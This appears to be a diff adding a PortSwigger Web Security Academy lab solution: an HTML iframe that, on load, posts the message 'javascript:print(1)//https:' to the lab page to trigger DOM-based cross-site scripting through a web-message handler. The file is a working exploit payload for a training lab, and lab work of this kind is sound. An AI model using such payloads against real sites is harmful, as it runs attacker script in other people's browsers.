@@ -1,0 +1,4 @@
+<!-- The payload below is meant to solve the following lab: -->
+<!-- https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url -->
+
+<iframe src="https://[LAB_SUB_DOMAIN].web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print(1)//https:','*')"></iframe>
